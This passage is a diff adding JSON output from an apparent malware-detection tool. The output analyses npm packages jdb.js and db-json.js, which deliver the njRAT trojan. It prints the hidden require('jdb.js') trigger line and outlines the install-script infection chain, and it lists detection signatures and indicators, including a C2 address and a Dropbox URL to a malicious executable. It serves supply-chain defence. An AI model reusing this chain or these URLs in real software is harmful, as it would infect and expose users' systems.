+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456618/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4273339509963989,
+              "code_similarity": 0.4017695486545563,
+              "behavior_similarity": 0.45289838314056396,
+              "matched_snippet": {
+                "snippet_id": "snippet_6",
+                "code_snippet": "require('jdb.js');",
+                "code_behavior": "At import-time or runtime, the last line of dbmanager.js explicitly loads and executes jdb.js, covertly triggering the malicious infection chain even if the user only interacts with db-json.js.",
+                "malice_analysis": {
+                  "why_suspicious": "A hidden require statement at the end of a file is a stealthy method to trigger malware execution without user awareness.",
+                  "violated_expectations": "Legitimate code does not secretly load unrelated or malicious modules, especially at the end of a file.",
+                  "similar_legitimate_use": "Dynamic requires are sometimes used for plugin systems, but not for loading unrelated or malicious code.",
+                  "key_indicators": [
+                    "Hidden require statement at end of file",
+                    "Triggers execution of malicious code path",
+                    "No legitimate reason for this import"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "db-json.js/dbmanager.js (last line)",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "jdb.js, db-json.js",
+                  "package_manager": "npm",
+                  "package_versions": "jdb.js: 1.0.0; db-json.js: 1.0.3, 1.0.4",
+                  "why_malicious": "Both packages are explicitly crafted to deliver and execute the njRAT/Bladabindi Remote Access Trojan on victim systems. 'jdb.js' directly drops and launches the RAT executable, while 'db-json.js' covertly includes 'jdb.js' as a dependency and triggers its execution, resulting in full system compromise, persistent remote access, and potential data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs db-json.js or jdb.js package.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code is prepared for execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "db-json.js pulls in jdb.js as a dependency and/or explicitly requires it in dbmanager.js.",
+                    "implemented_by": [
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Triggers execution of jdb.js malicious logic."
+                  },
+                  {
+                    "step": 3,
+                    "action": "jdb.js install script executes obfuscated module.js.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "module.js decodes and writes patch.exe to disk, then launches it."
+                  },
+                  {
+                    "step": 4,
+                    "action": "patch.exe (njRAT dropper) copies itself to TEMP as dchps.exe, modifies firewall rules, and launches RAT payload.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System is infected with njRAT."
+                  },
+                  {
+                    "step": 5,
+                    "action": "dchps.exe (njRAT) connects to C2 server, awaits commands for remote control, data theft, and system manipulation.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains full remote access and control over the victim system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm install scripts that execute obfuscated JavaScript files unrelated to build or setup",
+                    "Presence of base64 or binary blobs in JavaScript files that decode to Windows executables",
+                    "Unexpected creation and execution of .exe files (e.g., patch.exe, dchps.exe) during npm package install",
+                    "Modification of Windows firewall rules via netsh.exe during or after npm install",
+                    "Outbound connections to hardcoded njRAT C2 IP addresses or suspicious external URLs"
+                  ],
+                  "file_indicators": [
+                    "patch.exe or dchps.exe present in the TEMP directory",
+                    "Obfuscated module.js file containing encoded payloads in jdb.js",
+                    "package.json with suspicious install scripts (e.g., \"install\": \"node module.js\")",
+                    "dbmanager.js with a hidden require('jdb.js') statement at the end of the file"
+                  ],
+                  "network_indicators": [
+                    "Connection attempts to 46.185.116.2:5552 (njRAT C2 server)",
+                    "Access to https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe",
+                    "Unusual outbound traffic from npm install or Node.js processes to external IPs or domains"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for install scripts that execute obfuscated or encoded JavaScript files. Flag packages that write and execute .exe files, especially in TEMP directories, during or after installation. Detect and alert on modifications to Windows firewall rules via netsh.exe initiated by npm or Node.js processes. Monitor for outbound connections to known njRAT C2 infrastructure (e.g., 46.185.116.2:5552) or suspicious Dropbox URLs. Scan package code for hidden require statements that load unrelated or suspicious modules, particularly at the end of files."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
